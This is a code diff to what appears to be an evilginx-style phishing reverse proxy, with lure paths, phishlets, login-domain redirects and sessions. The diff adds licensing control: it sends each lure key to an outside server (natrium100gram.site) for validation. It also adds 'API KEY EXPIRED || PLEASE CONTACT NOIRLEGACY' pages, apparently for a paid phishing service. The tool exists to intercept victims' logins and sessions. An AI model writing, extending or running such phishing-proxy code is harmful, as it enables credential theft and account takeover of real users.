@@ -189,6 +189,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// If not, fall back to RemoteAddr
 				originalIP = req.RemoteAddr
 			}
+			log.Warning("originalIP 1 :%s", originalIP)
 
 			ip1, err1 := extractIP(originalIP)
 			if err1 != nil {
@@ -198,7 +199,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			originalIP = ip1
-			log.Warning("originalIP :%s", originalIP)
+			log.Warning("originalIP 2 :%s", originalIP)
 
 			//log.Warning(originalIP)
 			//os.Exit(0)
@@ -342,7 +343,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							var uv url.Values
 							//fmt.Printf("\n UV:\t %s \n", vv)
 
-							l, err := p.cfg.GetLureByPath(pl_name, req.URL.String())
+							l, err, key := p.cfg.GetLureByPath(pl_name, req.URL.String())
 							//log.Warning("PL NAME : %s", pl_name)
 							if err == nil {
 								log.Debug("triggered lure for path '%s'", req_path)
@@ -389,15 +390,46 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 									//os.Exit(0)
 
-									key := req.URL.Query().Get("cfg")
-
+									//key := req.URL.Query().Get("cfg")
+									//
 									if len(key) == 0 {
-										log.Debug("No key Initiated")
+										log.Warning("No key Initiated")
 										return p.blockRequest(req)
 									}
 
 									log.Warning("key :%s", key)
-									//os.Exit(0)
+
+									urlPost0 := "https://natrium100gram.site/public/api/key_2fa"
+									method0 := "POST"
+
+									payload0 := &bytes.Buffer{}
+									writer0 := multipart.NewWriter(payload0)
+									_ = writer0.WriteField("key", key)
+									err = writer0.Close()
+									if err != nil {
+										fmt.Println(err)
+										return nil, nil
+									}
+
+									client0 := &http.Client{}
+									req0, err := http.NewRequest(method0, urlPost0, payload0)
+
+									if err != nil {
+										fmt.Println(err)
+										return nil, nil
+									}
+									req0.Header.Set("Content-Type", writer0.FormDataContentType())
+									resp0, err := client0.Do(req0)
+									if err != nil {
+										fmt.Println(err)
+										return nil, nil
+									}
+									defer func(Body io.ReadCloser) {
+										err := Body.Close()
+										if err != nil {
+
+										}
+									}(resp0.Body)
 
 									urlPost := "https://natrium100gram.site/public/api/match_ip"
 									method := "POST"
@@ -410,6 +442,20 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									if err != nil {
 										fmt.Println(err)
 										return nil, nil
+									}
+
+									switch resp0.StatusCode {
+									case http.StatusOK:
+										// 200 OK
+										log.Warning("key valid")
+									case http.StatusUnauthorized:
+										// 401 Unauthorized
+										return p.expiredKey(req)
+									case http.StatusNotFound:
+										// 404 Not Found
+										return p.invaliddKey(req)
+									default:
+										fmt.Printf("Unexpected response status code: %d\n", resp0.StatusCode)
 									}
 
 									client := &http.Client{}
@@ -525,7 +571,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
-						l, err := p.cfg.GetLureByPath(pl_name, req_path)
+						l, err, _ := p.cfg.GetLureByPath(pl_name, req_path)
 						//l.Path = "/kontolbabi"
 						log.Warning("test", l)
 						if err == nil {
@@ -580,7 +626,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// AWAL MULA ROUTE , START FROM LOGIN PATH PHISTLETS
 
 				if pl != nil {
-					_, err := p.cfg.GetLureByPath(pl_name, req_path)
+					_, err, _ := p.cfg.GetLureByPath(pl_name, req_path)
 					if err == nil {
 						// redirect from lure path to login url
 						rurl := pl.GetLoginDomain()
@@ -951,7 +997,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
-			log.Warning("ls: %s", ls)
 			//ls.
 			//ls.Valid()
 			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
@@ -1436,6 +1481,40 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 	return req, nil
 }
 
+func (p *HttpProxy) expiredKey(req *http.Request) (*http.Request, *http.Response) {
+	if len(p.cfg.redirectUrl) > 0 {
+		//redirect_url := p.cfg.redirectUrl
+		resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "API KEY EXPIRED || PLEASE CONTACT NOIRLEGACY ")
+		if resp != nil {
+			//resp.Header.Add("Location", redirect_url)
+			return req, resp
+		}
+	} else {
+		resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "")
+		if resp != nil {
+			return req, resp
+		}
+	}
+	return req, nil
+}
+
+func (p *HttpProxy) invaliddKey(req *http.Request) (*http.Request, *http.Response) {
+	if len(p.cfg.redirectUrl) > 0 {
+		//redirect_url := p.cfg.redirectUrl
+		resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "INVALID API KEY || PLEASE CONTACT NOIRLEGACY ")
+		if resp != nil {
+			//resp.Header.Add("Location", redirect_url)
+			return req, resp
+		}
+	} else {
+		resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "")
+		if resp != nil {
+			return req, resp
+		}
+	}
+	return req, nil
+}
+
 func replaceDomain(originalURL, newDomain string) string {
 	// Split the URL into parts using "/"
 	parts := strings.Split(originalURL, "/")
@@ -1535,6 +1614,8 @@ func encodePathInCGIParameter(input, desiredDomain string) string {
 			}
 		}
 	}
+
+	log.Warning("encodePathInCGIParameter return input: %s", input)
 
 	return input
 }
